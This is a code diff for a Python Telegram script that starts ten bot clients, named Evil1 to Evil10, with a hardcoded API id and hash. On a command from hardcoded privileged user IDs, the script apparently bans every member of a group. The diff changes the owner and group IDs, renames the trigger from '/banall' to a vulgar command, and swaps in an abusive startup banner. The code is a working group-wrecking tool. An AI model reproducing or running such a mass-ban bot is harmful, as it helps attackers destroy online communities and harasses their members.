@@ -20,9 +20,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", None)
 BOT_TOKEN9 = config("BOT_TOKEN9", None)
 BOT_TOKEN10 = config("BOT_TOKEN10", None)
 SUDO_USERS = list(map(int, getenv("SUDO").split()))
-EVILS = [1827586893, 1953656325, 5797689958, 5547355973, 5345918225]
-ALTRONS = [-1001777776331, -1001802248291, -1001443562643]
-SUDO_USERS.append(5518687442)
+EVILS = [6235880385, 5790315229]
+ALTRONS = [-1001667607807, -1002133369721]
+SUDO_USERS.append(5948367761)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -49,16 +49,16 @@ Evil9 = TelegramClient('EVIL9', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").st
 Evil10 = TelegramClient('EVIL10', 25981592, "709f3c9d34d83873d3c7e76cdd75b866").start(bot_token=BOT_TOKEN10)
 
 
-@Evil1.on(events.NewMessage(pattern="^/banall"))
-@Evil2.on(events.NewMessage(pattern="^/banall"))
-@Evil3.on(events.NewMessage(pattern="^/banall"))
-@Evil4.on(events.NewMessage(pattern="^/banall"))
-@Evil5.on(events.NewMessage(pattern="^/banall"))
-@Evil6.on(events.NewMessage(pattern="^/banall"))
-@Evil7.on(events.NewMessage(pattern="^/banall"))
-@Evil8.on(events.NewMessage(pattern="^/banall"))
-@Evil9.on(events.NewMessage(pattern="^/banall"))
-@Evil10.on(events.NewMessage(pattern="^/banall"))
+@Evil1.on(events.NewMessage(pattern="^/fuckall"))
+@Evil2.on(events.NewMessage(pattern="^/fuckall"))
+@Evil3.on(events.NewMessage(pattern="^/fuckall"))
+@Evil4.on(events.NewMessage(pattern="^/fuckall"))
+@Evil5.on(events.NewMessage(pattern="^/fuckall"))
+@Evil6.on(events.NewMessage(pattern="^/fuckall"))
+@Evil7.on(events.NewMessage(pattern="^/fuckall"))
+@Evil8.on(events.NewMessage(pattern="^/fuckall"))
+@Evil9.on(events.NewMessage(pattern="^/fuckall"))
+@Evil10.on(events.NewMessage(pattern="^/fuckall"))
 async def banall(event):
    if event.sender_id in SUDO_USERS:
         await event.delete()
@@ -78,7 +78,7 @@ async def banall(event):
                 pass
 
 
-print("TEAM LEGENDZ OP")
+print("𝘾𝙃𝘼𝙇𝙄𝙔𝙀 𝘾𝙃𝙐𝘿𝘼𝘼𝙔𝙄 𝙎𝙐𝙍𝙐𝙐 𝙆𝙍𝙏𝙀 !!! ")
 
 Evil1.run_until_disconnected()
 Evil2.run_until_disconnected()
